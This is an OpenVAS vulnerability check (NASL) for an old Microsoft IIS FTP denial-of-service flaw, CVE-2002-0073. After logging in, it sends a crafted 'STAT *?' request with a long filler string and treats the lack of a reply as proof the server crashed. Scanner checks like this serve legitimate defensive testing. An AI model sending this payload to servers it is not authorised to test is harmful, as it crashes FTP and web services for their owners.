###############################################################################
# OpenVAS Vulnerability Test
#
# Microsoft IIS FTP Connection Status Request Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:microsoft:ftp_service";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802441");
  script_version("2019-05-03T08:55:39+0000");
  script_cve_id("CVE-2002-0073");
  script_bugtraq_id(4482);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2019-05-03 08:55:39 +0000 (Fri, 03 May 2019)");
  script_tag(name:"creation_date", value:"2012-07-04 18:21:03 +0530 (Wed, 04 Jul 2012)");
  script_name("Microsoft IIS FTP Connection Status Request Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("secpod_ms_iis_ftpd_detect.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("MS/IIS-FTP/Installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/8801");
  script_xref(name:"URL", value:"http://www.cert.org/advisories/CA-2002-09.html");
  script_xref(name:"URL", value:"http://marc.info/?l=bugtraq&m=101901273810598&w=2");
  script_xref(name:"URL", value:"http://technet.microsoft.com/en-us/security/bulletin/ms02-018");
  script_xref(name:"URL", value:"http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20020415-ms02-018");

  script_tag(name:"impact", value:"Successful exploitation will allows remote users to crash the application
  leading to denial of service condition or execute arbitrary code.");

  script_tag(name:"affected", value:"Microsoft Internet Information Services version 4.0, 5.0 and 5.1.");

  script_tag(name:"insight", value:"Error in the handling of FTP session status requests. If a remote attacker
  with an existing FTP session sends a malformed FTP session status request,
  an access violation error could occur that would cause the termination of
  FTP and Web services on the affected server.");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the references for more information.");

  script_tag(name:"summary", value:"This host is missing important security update according to
  Microsoft Bulletin MS02-018.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if(!ftpPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!ftpLoc = get_app_location(port:ftpPort, cpe:CPE)){
  exit(0);
}

soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

kb_creds = ftp_get_kb_creds();
login = kb_creds["login"];
pass = kb_creds["pass"];

ftplogin = ftp_log_in(socket:soc, user:login, pass:pass);
if(!ftplogin){
  close(soc);
  exit(0);
}

req = string("STAT *?", crap(1240), "\r\n");
send(socket:soc, data:req);

sleep(3);

send(socket:soc, data:string("HELP\r\n"));
recv = ftp_recv_line(socket:soc);

if(!recv){
  security_message(port:ftpPort);
  exit(0);
}

close(soc);

exit(99);